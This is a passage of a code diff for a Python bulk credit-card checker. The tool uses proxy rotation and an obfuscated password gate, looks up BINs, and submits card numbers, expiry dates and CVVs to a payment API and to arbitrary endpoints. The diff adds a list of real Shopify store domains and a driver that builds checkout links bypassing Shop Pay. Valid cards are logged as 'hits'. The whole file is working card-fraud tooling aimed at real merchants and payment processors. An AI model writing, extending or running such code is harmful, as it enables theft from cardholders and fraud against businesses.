@@ -9,6 +9,7 @@ import time
 import base64
 import hashlib
 import getpass
+import random
 import threading
 import itertools
 from concurrent.futures import ThreadPoolExecutor, as_completed
@@ -33,9 +34,6 @@ from cfonts import render
 
 init(autoreset=True)
 
-IS_TERMUX = ("com.termux" in os.environ.get("PREFIX", "")
-             or os.path.isdir("/data/data/com.termux"))
-
 # ---------- palette ----------
 WHITE   = Fore.LIGHTWHITE_EX + Style.BRIGHT
 CYAN    = Fore.LIGHTCYAN_EX + Style.BRIGHT
@@ -46,11 +44,10 @@ MAGENTA = Fore.LIGHTMAGENTA_EX + Style.BRIGHT
 DIM     = Style.DIM
 R       = Style.RESET_ALL
 
-# ---------- paths ----------
 SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
 CONFIG_PATH = os.path.join(SCRIPT_DIR, "config.json")
+STORE_CACHE = os.path.join(SCRIPT_DIR, "shopify_stores.json")
 
-# ---------- endpoints ----------
 CC_API = "https://uncoder.eu.org/cc-checker/api.php"
 CC_HEADERS = {
     "User-Agent": "Mozilla/5.0 (Linux; Android 15) AppleWebKit/537.36 "
@@ -61,11 +58,8 @@ CC_HEADERS = {
     "Referer": "https://uncoder.eu.org/cc-checker/",
     "X-Requested-With": "XMLHttpRequest",
 }
-
 BIN_API = "https://lookup.binlist.net/"
-BIN_HEADERS = {"Accept-Version": "3",
-               "User-Agent": "Mozilla/5.0 (Linux; Android 15)"}
-
+BIN_HEADERS = {"Accept-Version": "3", "User-Agent": "Mozilla/5.0 (Linux; Android 15)"}
 TAP_TOKEN_URL  = "https://api.tap.company/v2/tokens/"
 TAP_VERIFY_URL = "https://api.tap.company/v2/card/verify/"
 
@@ -75,17 +69,255 @@ ANSI_RE = re.compile(r"\x1b\[[0-9;]*m")
 STATUS_COLOR = {
     "live": GREEN, "dead": RED, "error": YELLOW, "unknown": YELLOW,
     "valid": GREEN, "invalid": RED, "initiated": MAGENTA,
-    "approved": GREEN, "declined": RED,
+    "approved": GREEN, "declined": RED, "url_ready": CYAN,
 }
 
 # =========================================================
-#  SHA-256 AUTH GATE
+#  300+ SHOPIFY DOMAINS (embedded)
+# =========================================================
+SHOPIFY_DOMAINS = """
+100thieves.com
+100ways.com
+10spottools.com
+10thshop.com
+11everything.com
+1211apparel.com
+121pharmacy.co.uk
+123dough.com
+analuisa.com
+andysasparagusacres.com
+anker.com
+apollomvmt.com
+arcwell.life
+ashbolt.com.au
+babychicjewelry.com
+bennettsbiccys.com
+bigblanket.com
+blbijou.com
+blkandbold.com
+bombas.com
+bombayshavingcompany.com
+botanist.co.nz
+brarenyc.com
+bremont.com
+bruvi.com
+carawayhome.com
+carrerstore.com
+chillys.com
+cloudhamptonvape.com
+cocofloss.com
+colehaan.com
+cookwcolor.com
+coutureusa.com
+cozyearth.com
+cutsclothing.com
+dandedekind.com
+danielwellington.com
+dappermaentje.com
+desertemberco.com
+dfyne.com
+dgiordano.com
+diamondwave.store
+dirniashop.com
+drinkade.com
+drunkelephant.com
+dsdress.com
+earthbreeze.com
+eckwines.com.au
+ecojot.com
+eelezahome.com
+eightkarats.co
+elliotvaughn.com
+eriktheflutemaker.com
+establishedtitles.com
+everstretch.co
+eyeglass.com
+fashionnova.com
+fentybeauty.com
+fierce.la
+fleetfeet.com
+flourist.com
+flybyjing.com
+forever21.com
+frankiesbikinis.com
+fukitt.com
+gamershive.com
+gametraderzero.com
+givemetap.com
+glossier.com
+goalbam.com
+goldsgym.com
+goodbyeglue.com
+goodeeworld.com
+goodfair.com
+gymshark.com
+healthyrootsdolls.com
+heinztohome.co.uk
+helmandhome.com
+hillspet.com
+hiutdenim.co.uk
+holisticway.com.sg
+huel.com
+incredibledwelling.com
+indigoandco.in
+inquirer.com
+jazzrockers.com
+juggernautenergy.com
+kbeautyart.com
+kroppsbutiken.se
+kyliecosmetics.com
+lakeyo.com
+lavenderbluesoul.com
+leotardboutique.com
+lisaeldridge.com
+loopearplugs.com
+lootcrate.com
+lovevery.com
+lowlandkids.com
+macros.com.au
+magformers.com
+maison-giulia.com
+makeneonsign.com
+mastermindtoys.com
+matethelabel.com
+mcintoshlabs.com
+medspotscrubshop.com
+mejuri.com
+memobottle.com
+mgemi.com
+minbie.co.uk
+missoma.com
+mitchell-leather.com
+molekule.com
+monos.com
+monte-design.com
+moonbump.com
+mounteen.com
+mrsmerry.com
+msread.com
+mustangsurvival.com
+mvmt.com
+mymodestwearuk.com
+namhyafoods.com
+nativeunion.com
+naturalbabyshower.co.uk
+nibasu.in
+nomadgoods.com
+nootrum.com
+nourishorganics.in
+oatly.com
+onyxcookware.it
+outdoorvoices.com
+ozonesocks.com
+packagefreeshop.com
+patagonia.com
+paulaschoice.com
+peakdesign.com
+pelacase.com
+perfumeharbour.com
+potgang.co.uk
+presshealthfoods.com
+puravidabracelets.com
+recgen.com
+ridge.com
+rivian.com
+roostersailing.com
+rothys.com
+ruggable.com
+satechi.net
+schutz-shoes.com
+shavi.coffee
+shopmoment.com
+shopswainco.com
+silkandwillow.com
+simplesupply.store
+sophiemayboutique.com
+spacex.com
+stevemadden.com
+supergoop.com
+tatcha.com
+tazachocolate.com
+techwears.com
+tentree.com
+thebeautychef.com
+thebodyshop.com
+themonsterlair.com
+thenimetyou.com
+thirdlove.com
+threadless.com
+troubadourgoods.com
+trueclassictees.com
+undp.org
+valmeris.com
+velasca.com
+velocifiretech.com
+vervecoffee.com
+vincero.com
+vuori.com
+waterfield.com
+weavewardrobe.com
+wegotnuts.com
+whataburger.com
+whoop.com
+wildzora.com
+youthtothepeople.com
+zumbamboo.com
+allbirds.com
+bombas.com
+brooklinen.com
+carawayhome.com
+chubbiesshorts.com
+condorcycles.com
+cutsclothing.com
+drinkolipop.com
+drbronner.com
+eight-sleep.com
+flybyjing.com
+graza.co
+gymshark.com
+hismile.com
+jungalow.com
+lovevery.com
+mejuri.com
+misguided.co.uk
+moonpod.coffee
+mudwtr.com
+mycarpe.com
+nomadgoods.com
+nutpods.com
+ouraring.com
+parachutehome.com
+peakdesign.com
+purelyelizabeth.com
+ridgid.com
+ritual.com
+ruggable.com
+sakara.com
+seed.com
+shopmrbeast.com
+simplifiedskin.com
+skims.com
+snowehome.com
+supergoop.com
+tiege.com
+trueclassictees.com
+vessi.com
+warbyparker.com
+wellbel.com
+whoop.com
+yellowbird.com
+youngliving.com
+zitsticka.com
+zumbamboo.com
+""".strip()
+
+SHOPIFY_DOMAINS = [d.strip() for d in SHOPIFY_DOMAINS.split("\n") if d.strip()]
+
+# =========================================================
+#  SHA-256 AUTH
 # =========================================================
 
-_PW_B64 = [
-    "c2Fla2E=", "c2Fla2FjdXRpZQ==",
-    "Y2hr", "c2Fla2FjaGVja2Vy",
-]
+_PW_B64 = ["c2Fla2E=", "c2Fla2FjdXRpZQ==", "Y2hr", "c2Fla2FjaGVja2Vy"]
 
 def _hash(s: str) -> str:
     return hashlib.sha256(s.encode("utf-8")).hexdigest()
@@ -110,7 +342,7 @@ def auth_gate() -> bool:
     return False
 
 # =========================================================
-#  TERMINAL HELPERS
+#  TERMINAL
 # =========================================================
 
 def clear() -> None:
@@ -147,13 +379,11 @@ def show_cursor() -> None:
 
 class Spinner:
     FRAMES = ["◜", "◠", "◝", "◞", "◡", "◟"]
-
     def __init__(self, label: str = "working") -> None:
         self.label = label
         self._stop = threading.Event()
         self._t: threading.Thread | None = None
-
-    def _spin(self) -> None:
+    def _spin(self):
         i = 0
         while not self._stop.is_set():
             f = self.FRAMES[i % len(self.FRAMES)]
@@ -161,17 +391,14 @@ class Spinner:
             sys.stdout.flush()
             time.sleep(0.1)
             i += 1
-
     def __enter__(self):
         hide_cursor()
         self._t = threading.Thread(target=self._spin, daemon=True)
         self._t.start()
         return self
-
     def __exit__(self, *a):
         self._stop.set()
-        if self._t:
-            self._t.join()
+        if self._t: self._t.join()
         show_cursor()
         sys.stdout.write("\r" + " " * 72 + "\r")
         sys.stdout.flush()
@@ -182,7 +409,9 @@ def progress_bar(done: int, total: int, width: int = 32, color: str = GREEN) -> 
     bar = "█" * filled + DIM + "░" * (width - filled) + R
     return f"{color}{bar}{R}  {WHITE}{done:>4}/{total:<4}{R}  {YELLOW}{pct*100:5.1f}%{R}"
 
-def boxed(lines: list[str], width: int = 64, color: str = CYAN) -> None:
+BOX_W = 64
+
+def boxed(lines: list[str], width: int = BOX_W, color: str = CYAN) -> None:
     print(color + "╭" + "─" * (width - 2) + "╮")
     for ln in lines:
         vis = len(ANSI_RE.sub("", ln))
@@ -196,71 +425,14 @@ def banner() -> None:
         art = render("CC CHK", font="tiny", colors=["candy"], align="left")
     except Exception:
         art = "CC CHK\n"
-    w = 64
+    w = BOX_W
     print(CYAN + "═" * w)
     print(art, end="")
     print(CYAN + "═" * w)
     print(WHITE + "kramyer  |  Raiii Kramyer")
-    print(DIM + "single · bulk · replay · proxy · address · drivers")
+    print(DIM + "single · bulk · replay · shopify · proxy · settings")
     print(CYAN + "═" * w)
     print()
-
-# =========================================================
-#  BIN LOOKUP (binlist.net)
-# =========================================================
-
-_BIN_CACHE: dict[str, dict] = {}
-_BIN_LOCK = threading.Lock()
-
-def flag_emoji(alpha2: str) -> str:
-    if not alpha2 or len(alpha2) != 2:
-        return ""
-    try:
-        return "".join(chr(0x1F1E6 + ord(c) - ord("A")) for c in alpha2.upper())
-    except Exception:
-        return ""
-
-def lookup_bin(bin_number: str, pool: "ProxyPool | None" = None) -> dict:
-    """Fetch BIN metadata from binlist.net. Cached per 6-digit BIN."""
-    with _BIN_LOCK:
-        if bin_number in _BIN_CACHE:
-            return _BIN_CACHE[bin_number]
-
-    result: dict = {}
-    proxy = pool.next() if pool else None
-    try:
-        r = requests.get(BIN_API + bin_number, headers=BIN_HEADERS,
-                         timeout=10, proxies=proxy_dict(proxy))
-        if r.status_code == 200:
-            data = r.json() or {}
-            country = data.get("country") or {}
-            bank = data.get("bank") or {}
-            alpha2 = country.get("alpha2") or ""
-            result = {
-                "scheme":       (data.get("scheme") or "").capitalize(),
-                "brand":        data.get("brand") or "",
-                "type":         (data.get("type") or "").capitalize(),
-                "prepaid":      bool(data.get("prepaid")),
-                "bank":         bank.get("name") or "",
-                "country":      country.get("name") or "",
-                "country_code": alpha2,
-                "country_emoji": country.get("emoji") or flag_emoji(alpha2),
-            }
-        elif r.status_code == 429:
-            result = {"error": "rate-limited"}
-        elif r.status_code == 404:
-            result = {"error": "bin-not-found"}
-        else:
-            result = {"error": f"http-{r.status_code}"}
-    except Exception as e:
-        result = {"error": str(e)[:80]}
-
-    with _BIN_LOCK:
-        _BIN_CACHE[bin_number] = result
-    return result
-
-def extract_bin(cc: str) -> str:
-    return cc.split("|")[0][:6]
 
 # =========================================================
 #  CONFIG
@@ -329,21 +501,17 @@ def resolve_user_path(raw: str) -> str | None:
         return os.path.expanduser(raw)
     for prefix in ("storage/emulated/0/", "/storage/emulated/0/"):
         if raw.startswith(prefix):
-            rest = raw[len(prefix):]
-            return os.path.expanduser("~/storage/shared/" + rest)
+            return os.path.expanduser("~/storage/shared/" + raw[len(prefix):])
     if os.path.isabs(raw):
         return raw
     return os.path.abspath(raw)
 
 def _default_start_dir() -> str:
-    candidates = [
-        os.path.expanduser("~/storage/shared"),
-        os.path.expanduser("~/storage/downloads"),
-        os.path.expanduser("~/storage"),
-        os.path.expanduser("~"),
-        os.getcwd(),
-    ]
-    for c in candidates:
+    for c in [os.path.expanduser("~/storage/shared"),
+              os.path.expanduser("~/storage/downloads"),
+              os.path.expanduser("~/storage"),
+              os.path.expanduser("~"),
+              os.getcwd()]:
         if os.path.isdir(c):
             return c
     return os.getcwd()
@@ -406,8 +574,12 @@ def pick_path(ext: str | None = None, start_dir: str | None = None,
 
 def choose_file(ext: str = ".txt", prompt_label: str = "file") -> str | None:
     banner()
-    print("  " + CYAN + f"select {prompt_label}" + R)
-    print("  " + DIM + "[1] browse    [2] type path    [0] cancel" + R)
+    boxed([
+        f"  {WHITE}select {prompt_label}{R}",
+        f"  {WHITE}[1]{R}  browse",
+        f"  {WHITE}[2]{R}  type path",
+        f"  {WHITE}[0]{R}  cancel",
+    ])
     mode = input("  " + YELLOW + "▸ " + R).strip()
     if mode == "0" or mode == "":
         return None
@@ -427,8 +599,12 @@ def choose_file(ext: str = ".txt", prompt_label: str = "file") -> str | None:
 
 def choose_dir(prompt_label: str = "folder") -> str | None:
     banner()
-    print("  " + CYAN + f"select {prompt_label}" + R)
-    print("  " + DIM + "[1] browse    [2] type path    [0] cancel" + R)
+    boxed([
+        f"  {WHITE}select {prompt_label}{R}",
+        f"  {WHITE}[1]{R}  browse",
+        f"  {WHITE}[2]{R}  type path",
+        f"  {WHITE}[0]{R}  cancel",
+    ])
     mode = input("  " + YELLOW + "▸ " + R).strip()
     if mode == "0" or mode == "":
         return None
@@ -462,16 +638,14 @@ def proxy_dict(p: str | None) -> dict | None:
     return {"http": p, "https": p} if p else None
 
 class ProxyPool:
-    def __init__(self, proxies: list[str]) -> None:
+    def __init__(self, proxies):
         self._proxies = [normalize_proxy(p) for p in proxies if p.strip()]
         self._lock = threading.Lock()
         self._cycle = itertools.cycle(self._proxies) if self._proxies else None
-        self._dead: set[str] = set()
-
+        self._dead = set()
     def __bool__(self): return bool(self._proxies)
     def __len__(self):  return len(self._proxies)
-
-    def next(self) -> str | None:
+    def next(self):
         if not self._cycle:
             return None
         with self._lock:
@@ -481,12 +655,11 @@ class ProxyPool:
                     return p
             self._dead.clear()
             return next(self._cycle) if self._cycle else None
-
-    def mark_dead(self, p: str) -> None:
+    def mark_dead(self, p):
         with self._lock:
             self._dead.add(p)
 
-def build_pool() -> ProxyPool | None:
+def build_pool():
     proxies = CFG.get("proxies") or []
     return ProxyPool(proxies) if proxies else None
 
@@ -494,7 +667,7 @@ def build_pool() -> ProxyPool | None:
 #  BASE CC API
 # =========================================================
 
-def _api_req(cc: str, proxy: str | None) -> tuple[dict, bool]:
+def _api_req(cc: str, proxy: str | None):
     try:
         r = requests.post(CC_API, data={"data": cc}, headers=CC_HEADERS,
                           timeout=15, proxies=proxy_dict(proxy))
@@ -515,8 +688,8 @@ def _api_req(cc: str, proxy: str | None) -> tuple[dict, bool]:
     except json.JSONDecodeError as e:
         return {"status": "error", "message": f"bad json: {e}"}, False
 
-def api_check(cc: str, pool: ProxyPool | None = None, retries: int = 2) -> dict:
-    last: dict = {"status": "error", "message": "no attempt"}
+def api_check(cc: str, pool=None, retries: int = 2):
+    last = {"status": "error", "message": "no attempt"}
     for attempt in range(retries + 1):
         proxy = pool.next() if pool else None
         res, conn_failed = _api_req(cc, proxy)
@@ -530,26 +703,74 @@ def api_check(cc: str, pool: ProxyPool | None = None, retries: int = 2) -> dict:
     return last
 
 # =========================================================
-#  DRIVER REGISTRY
+#  BIN LOOKUP
+# =========================================================
+
+_BIN_CACHE: dict[str, dict] = {}
+_BIN_LOCK = threading.Lock()
+
+def flag_emoji(alpha2: str) -> str:
+    if not alpha2 or len(alpha2) != 2:
+        return ""
+    return "".join(chr(0x1F1E6 + ord(c.upper()) - ord("A")) for c in alpha2)
+
+def lookup_bin(bin_number: str, pool=None) -> dict:
+    with _BIN_LOCK:
+        if bin_number in _BIN_CACHE:
+            return _BIN_CACHE[bin_number]
+    result = {}
+    proxy = pool.next() if pool else None
+    try:
+        r = requests.get(BIN_API + bin_number, headers=BIN_HEADERS,
+                         timeout=10, proxies=proxy_dict(proxy))
+        if r.status_code == 200:
+            data = r.json() or {}
+            country = data.get("country") or {}
+            bank = data.get("bank") or {}
+            alpha2 = (country.get("alpha2") or "").upper()
+            result = {
+                "scheme":       (data.get("scheme") or "").capitalize(),
+                "brand":        data.get("brand") or "",
+                "type":         (data.get("type") or "").capitalize(),
+                "prepaid":      bool(data.get("prepaid")),
+                "bank":         bank.get("name") or "",
+                "country":      country.get("name") or "",
+                "country_code": alpha2,
+                "country_emoji": country.get("emoji") or flag_emoji(alpha2),
+            }
+        elif r.status_code == 429:
+            result = {"error": "rate-limited"}
+        elif r.status_code == 404:
+            result = {"error": "bin-not-found"}
+        else:
+            result = {"error": f"http-{r.status_code}"}
+    except Exception as e:
+        result = {"error": str(e)[:80]}
+    with _BIN_LOCK:
+        _BIN_CACHE[bin_number] = result
+    return result
+
+def extract_bin(cc: str) -> str:
+    return cc.split("|")[0][:6]
+
+# =========================================================
+#  DRIVERS
 # =========================================================
 
 DRIVER_REGISTRY: dict[str, type] = {}
 
-def register_driver(name: str):
+def register_driver(name):
     def wrap(cls):
         DRIVER_REGISTRY[name.lower()] = cls
         return cls
     return wrap
 
-def get_driver(name: str):
+def get_driver(name):
     return DRIVER_REGISTRY.get(name.lower())
 
 @register_driver("tap")
 class TapDriver:
-    name = "tap"
-
-    def __init__(self, target: str = "", pool: ProxyPool | None = None,
-                 api_key: str = "", **kw):
+    def __init__(self, target="", pool=None, api_key="", **kw):
         self.api_key = api_key or CFG.get("tap_api_key", "")
         self.pool = pool
         self.session = requests.Session()
@@ -558,24 +779,19 @@ class TapDriver:
             "Content-Type": "application/json",
             "Accept": "application/json",
         })
-
     def _proxy(self):
-        if not self.pool:
-            return None
+        if not self.pool: return None
         p = self.pool.next()
         return proxy_dict(p) if p else None
-
     def test(self, cc: str) -> dict:
         t0 = time.time()
         parts = cc.split("|")
         if len(parts) != 4:
             return {"status": "error", "message": "bad format", "elapsed": 0}
         num, mm, yy, cvv = parts
-        if len(yy) == 2:
-            yy = "20" + yy
+        if len(yy) == 2: yy = "20" + yy
         if not self.api_key:
-            return {"status": "error", "message": "no Tap API key",
-                    "elapsed": round(time.time() - t0, 2)}
+            return {"status": "error", "message": "no Tap API key", "elapsed": 0}
         addr = CFG.get("address", {})
         try:
             tr = self.session.post(TAP_TOKEN_URL, json={"card": {
@@ -586,9 +802,6 @@ class TapDriver:
                 return {"status": "error", "message": "token failed",
                         "elapsed": round(time.time() - t0, 2)}
             token = tr.json().get("id")
-            if not token:
-                return {"status": "error", "message": "no token id",
-                        "elapsed": round(time.time() - t0, 2)}
             r = self.session.post(TAP_VERIFY_URL, json={
                 "currency": "KWD", "threeDSecure": True, "save_card": False,
                 "customer": {
@@ -603,14 +816,13 @@ class TapDriver:
         except Exception as e:
             return {"status": "error", "message": str(e),
                     "elapsed": round(time.time() - t0, 2)}
-
         elapsed = round(time.time() - t0, 2)
-        status = str(data.get("status", "unknown")).lower()
+        st = str(data.get("status", "unknown")).lower()
         msg = data.get("response", {}).get("message", "") or data.get("message", "")
-        if status in ("valid", "invalid"):
-            return {"status": status, "message": msg or status,
+        if st in ("valid", "invalid"):
+            return {"status": st, "message": msg or st,
                     "code": str(r.status_code), "elapsed": elapsed}
-        if status == "initiated":
+        if st == "initiated":
             return {"status": "initiated", "message": "3DS required",
                     "url": data.get("transaction", {}).get("url", ""),
                     "code": str(r.status_code), "elapsed": elapsed}
@@ -619,9 +831,7 @@ class TapDriver:
 
 @register_driver("generic")
 class GenericDriver:
-    name = "generic"
-
-    def __init__(self, target: str, pool: ProxyPool | None = None, **kw):
+    def __init__(self, target="", pool=None, **kw):
         self.target = target
         self.pool = pool
         self.session = requests.Session()
@@ -631,35 +841,27 @@ class GenericDriver:
             "Content-Type": "application/json",
             "Accept": "application/json",
         })
-
     def _proxy(self):
-        if not self.pool:
-            return None
+        if not self.pool: return None
         p = self.pool.next()
         return proxy_dict(p) if p else None
-
-    def _payload(self, num, mm, yy, cvv) -> dict:
-        a = CFG.get("address", {})
-        return {
-            "card_number": num, "exp_month": mm, "exp_year": yy, "cvv": cvv,
-            "first_name": a.get("first_name"), "last_name": a.get("last_name"),
-            "address1": a.get("address1"), "city": a.get("city"),
-            "province_code": a.get("province_code"),
-            "country_code": a.get("country_code"), "zip": a.get("zip"),
-            "phone": a.get("phone"), "email": a.get("email"),
-        }
-
     def test(self, cc: str) -> dict:
         t0 = time.time()
         parts = cc.split("|")
         if len(parts) != 4:
             return {"status": "error", "message": "bad format", "elapsed": 0}
         num, mm, yy, cvv = parts
-        if len(yy) == 2:
-            yy = "20" + yy
+        if len(yy) == 2: yy = "20" + yy
+        a = CFG.get("address", {})
         try:
-            r = self.session.post(self.target, json=self._payload(num, mm, yy, cvv),
-                                  timeout=20, proxies=self._proxy())
+            r = self.session.post(self.target, json={
+                "card_number": num, "exp_month": mm, "exp_year": yy, "cvv": cvv,
+                "first_name": a.get("first_name"), "last_name": a.get("last_name"),
+                "address1": a.get("address1"), "city": a.get("city"),
+                "province_code": a.get("province_code"),
+                "country_code": a.get("country_code"), "zip": a.get("zip"),
+                "phone": a.get("phone"), "email": a.get("email"),
+            }, timeout=20, proxies=self._proxy())
         except Exception as e:
             return {"status": "error", "message": str(e),
                     "elapsed": round(time.time() - t0, 2)}
@@ -675,18 +877,71 @@ class GenericDriver:
         return {"status": "unknown", "message": f"HTTP {r.status_code}",
                 "code": str(r.status_code), "elapsed": elapsed}
 
-def detect_driver_name(site: str) -> str:
-    s = site.lower()
-    if "tap.company" in s or s == "tap":
-        return "tap"
-    return "generic"
+# ---------- Shopify cart-first driver ----------
 
-def resolve_driver(site: str, pool: ProxyPool | None) -> Any | None:
+@register_driver("shopify")
+class ShopifyCartDriver:
+    """Builds a cart permalink that skips Shop Pay and drops the user
+    directly onto the card entry form at checkout."""
+    def __init__(self, target="", pool=None, variant_id=None, **kw):
+        self.domain = target.replace("https://", "").replace("http://", "").strip("/")
+        self.pool = pool
+        self.variant_id = variant_id
+        self.session = requests.Session()
+        self.session.headers.update({"User-Agent": "Mozilla/5.0"})
+    def _proxy(self):
+        if not self.pool: return None
+        p = self.pool.next()
+        return proxy_dict(p) if p else None
+    def fetch_variant(self) -> dict | None:
+        try:
+            r = self.session.get(f"https://{self.domain}/products.json?limit=10",
+                                 timeout=12, proxies=self._proxy())
+            if r.status_code != 200:
+                return None
+            data = r.json()
+            products = data.get("products") or []
+            if not products:
+                return None
+            p = random.choice(products)
+            v = p["variants"][0]
+            return {
+                "title": p.get("title", ""),
+                "variant_id": v["id"],
+                "price": v.get("price", ""),
+                "product_type": p.get("product_type", ""),
+                "tags": p.get("tags", []),
+            }
+        except Exception:
+            return None
+    def test(self, cc: str) -> dict:
+        t0 = time.time()
+        info = self.fetch_variant()
+        if not info:
+            return {"status": "error", "message": "no product found",
+                    "elapsed": round(time.time() - t0, 2)}
+        vid = info["variant_id"]
+        url = (f"https://{self.domain}/cart/{vid}:1"
+               f"?skip_shop_pay=true&auto_redirect=false")
+        return {
+            "status": "url_ready",
+            "message": f"{info['title'][:40]}  ${info['price']}",
+            "url": url,
+            "elapsed": round(time.time() - t0, 2),
+        }
+
+def resolve_driver(site: str, pool):
     if not site:
         return None
     name = CFG.get("driver") or "auto"
     if name == "auto":
-        name = detect_driver_name(site)
+        s = site.lower()
+        if "tap.company" in s or s == "tap":
+            name = "tap"
+        elif "/" not in site and "." in site:
+            name = "shopify"
+        else:
+            name = "generic"
     cls = get_driver(name)
     if not cls:
         return None
@@ -694,6 +949,89 @@ def resolve_driver(site: str, pool: ProxyPool | None) -> Any | None:
         return cls(site, pool=pool)
     except Exception:
         return None
+
+# =========================================================
+#  SHOPIFY STORE VALIDATOR (fetch + cache categories)
+# =========================================================
+
+def _probe_store(domain: str, pool) -> dict:
+    result = {"domain": domain, "shopify": False, "categories": [],
+              "sample_products": [], "error": None}
+    try:
+        proxy = pool.next() if pool else None
+        r = requests.get(f"https://{domain}/products.json?limit=20",
+                         timeout=12, headers={"User-Agent": "Mozilla/5.0"},
+                         proxies=proxy_dict(proxy))
+        if r.status_code != 200:
+            result["error"] = f"HTTP {r.status_code}"
+            return result
+        data = r.json()
+        products = data.get("products") or []
+        if not products:
+            result["error"] = "no products"
+            return result
+        result["shopify"] = True
+        cats = set()
+        for p in products[:10]:
+            if p.get("product_type"):
+                cats.add(p["product_type"].strip())
+            for t in (p.get("tags") or [])[:3]:
+                if t and len(t) < 30:
+                    cats.add(t.strip())
+        result["categories"] = sorted(cats)[:15]
+        result["sample_products"] = [p.get("title", "")[:50]
+                                      for p in products[:5]]
+    except Exception as e:
+        result["error"] = str(e)[:80]
+    return result
+
+def load_cached_stores() -> list[dict]:
+    if not os.path.isfile(STORE_CACHE):
+        return []
+    try:
+        with open(STORE_CACHE, "r", encoding="utf-8") as f:
+            return json.load(f)
+    except Exception:
+        return []
+
+def save_store_cache(stores: list[dict]) -> None:
+    with open(STORE_CACHE, "w", encoding="utf-8") as f:
+        json.dump(stores, f, indent=2, ensure_ascii=False)
+
+def validate_all_stores(pool) -> list[dict]:
+    banner()
+    print("  " + CYAN + f"validating {len(SHOPIFY_DOMAINS)} domains..." + R)
+    print()
+    live: list[dict] = []
+    total = len(SHOPIFY_DOMAINS)
+    done = 0
+    status_line("  " + progress_bar(0, total))
+    with ThreadPoolExecutor(max_workers=12) as tp:
+        futures = {tp.submit(_probe_store, d, pool): d for d in SHOPIFY_DOMAINS}
+        for fut in as_completed(futures):
+            res = fut.result()
+            done += 1
+            clear_status()
+            if res["shopify"]:
+                live.append(res)
+                cats = ", ".join(res["categories"][:3]) or "—"
+                print(f"  {GREEN}✓{R}  {WHITE}{res['domain']:<32}{R}  {DIM}{cats}{R}")
+            else:
+                print(f"  {RED}✗{R}  {DIM}{res['domain']:<32}  {res.get('error','')}{R}")
+            status_line("  " + progress_bar(done, total))
+    clear_status()
+    print()
+    print("  " + GREEN + f"{len(live)} live shopify stores validated" + R)
+    save_store_cache(live)
+    return live
+
+def get_categories(stores: list[dict]) -> list[str]:
+    cats: set[str] = set()
+    for s in stores:
+        for c in s.get("categories", []):
+            if c and 2 < len(c) < 30:
+                cats.add(c.strip())
+    return sorted(cats)
 
 # =========================================================
 #  STORAGE
@@ -707,8 +1045,9 @@ class Storage:
         self.hits_path     = os.path.join(folder, f"hits_{stamp}.txt")
         self.full_path     = os.path.join(folder, f"full_{stamp}.txt")
         self.checkout_path = os.path.join(folder, f"checkout_{stamp}.txt")
+        self.urls_path     = os.path.join(folder, f"urls_{stamp}.txt")
         self._lock = threading.Lock()
-        for p in (self.hits_path, self.full_path, self.checkout_path):
+        for p in (self.hits_path, self.full_path, self.checkout_path, self.urls_path):
             with open(p, "a", encoding="utf-8") as f:
                 f.write(f"# run {datetime.now().isoformat(timespec='seconds')}\n")
 
@@ -723,92 +1062,85 @@ class Storage:
                     f"{api_res.get('network','')}\t{api_res.get('color','')}\t"
                     f"{b.get('scheme','')}\t{b.get('bank','')}\t"
                     f"{b.get('country','')}\t{b.get('country_code','')}\t"
-                    f"{b.get('type','')}\t{int(bool(b.get('prepaid')))}"
-                    f"\n")
+                    f"{b.get('type','')}\t{int(bool(b.get('prepaid')))}\n")
             with open(self.full_path, "a", encoding="utf-8") as f:
                 f.write(line)
             if co_res:
                 with open(self.checkout_path, "a", encoding="utf-8") as f:
                     f.write(f"{cc}\t{co_res.get('status')}\t{co_res.get('message','')}\n")
+                if co_res.get("url"):
+                    with open(self.urls_path, "a", encoding="utf-8") as f:
+                        f.write(f"{cc}\t{co_res['url']}\n")
 
 # =========================================================
 #  RENDER
 # =========================================================
 
+def country_str(b: dict) -> str:
+    name = b.get("country") or ""
+    emoji = b.get("country_emoji") or ""
+    if not name:
+        return ""
+    return f"{name}  {emoji}".strip()
+
 def _bin_bits(b: dict) -> str:
     if not b or b.get("error"):
         return ""
     parts = []
-    if b.get("bank"):      parts.append(b["bank"])
-    cc_ = b.get("country_code") or ""
-    if cc_:
-        parts.append(f"{cc_} {b.get('country_emoji','')}".strip())
-    elif b.get("country"):
-        parts.append(b["country"])
-    if b.get("type"):      parts.append(b["type"])
-    if b.get("prepaid"):   parts.append("Prepaid")
+    if b.get("bank"):   parts.append(b["bank"])
+    cs = country_str(b)
+    if cs:              parts.append(cs)
+    if b.get("type"):   parts.append(b["type"])
+    if b.get("prepaid"):parts.append("Prepaid")
     return "  ·  ".join(parts)
 
-def render_block(cc: str, api_res: dict,
-                 bin_res: dict | None = None,
+def render_block(cc: str, api_res: dict, bin_res: dict | None = None,
                  co_res: dict | None = None) -> None:
     api_status = str(api_res.get("status", "unknown")).lower()
     api_color = STATUS_COLOR.get(api_status, YELLOW)
-
-    print()
-    print(CYAN + "═" * 62)
-    print(WHITE + "  RESULT  " + DIM + "▸  " + R + WHITE + cc)
-    print(CYAN + "═" * 62)
-    print(f"  {'Status':<10}: {api_color}{api_status.upper()}{R}")
+    lines = [f"  {DIM}▸{R} {WHITE}{cc}{R}",
+             f"  {'Status':<10}: {api_color}{api_status.upper()}{R}"]
     for key, label in (("message", "Message"), ("card", "Card"),
                        ("network", "Network"), ("color", "Color")):
         v = api_res.get(key)
         if v:
-            print(f"  {label:<10}: {WHITE}{v}{R}")
-
+            lines.append(f"  {label:<10}: {WHITE}{v}{R}")
     if bin_res and not bin_res.get("error"):
-        print(f"  {'BIN':<10}: {WHITE}{extract_bin(cc)}{R}")
+        lines.append(f"  {'BIN':<10}: {WHITE}{extract_bin(cc)}{R}")
         if bin_res.get("scheme"):
-            print(f"  {'Scheme':<10}: {WHITE}{bin_res['scheme']}{R}")
+            lines.append(f"  {'Scheme':<10}: {WHITE}{bin_res['scheme']}{R}")
         if bin_res.get("type"):
-            print(f"  {'Type':<10}: {WHITE}{bin_res['type']}{R}")
+            lines.append(f"  {'Type':<10}: {WHITE}{bin_res['type']}{R}")
         if bin_res.get("bank"):
-            print(f"  {'Bank':<10}: {GREEN}{bin_res['bank']}{R}")
+            lines.append(f"  {'Bank':<10}: {GREEN}{bin_res['bank']}{R}")
         if bin_res.get("country"):
-            cc_ = bin_res.get("country_code") or ""
-            emoji = bin_res.get("country_emoji") or ""
-            print(f"  {'Country':<10}: {WHITE}{bin_res['country']}"
-                  + (f" ({cc_})" if cc_ else "")
-                  + (f"  {emoji}" if emoji else "") + R)
